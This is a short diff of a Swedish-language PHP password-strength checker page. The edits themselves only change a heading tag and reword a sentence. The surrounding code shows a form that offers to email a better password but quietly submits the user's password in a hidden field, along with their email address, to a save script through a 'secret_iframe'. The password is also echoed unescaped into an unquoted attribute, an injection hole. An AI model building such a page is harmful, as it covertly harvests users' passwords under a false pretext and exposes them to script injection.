@@ -120,7 +120,7 @@
           </td>
         </tr>
       </table>
-      <h1>
+      <h2>
         Poäng: <?php
           $score = 0;
           if($contains_lower == 1) {
@@ -150,7 +150,7 @@
           }
           echo $score;
         ?>
-      </h1>
+      </h2>
       <p>
         Ditt lösenord är
         <?php
@@ -163,10 +163,9 @@
           }
         ?>
       </p>
-      <br>
       <p>
-        Om du vill ha ett bättre lösenord kan du skriva in din emailadress här så skickar vi<br>
-        ett bra lösenord till dig när vår superhögteknologiska lösenordsgenerator passerar betastadiet.
+        Om du vill ha ett bättre lösenord kan du skriva in din emailadress här så skickar vi ett bättre<br>
+        lösenord till dig när vår superhögteknologiska lösenordsgenerator passerar betastadiet.
       </p>
       <form action="save_email_and_pw.php" method="post" target="secret_iframe">
         <input type="password" name="password" value=<?php echo $password; ?> style="display: none;">
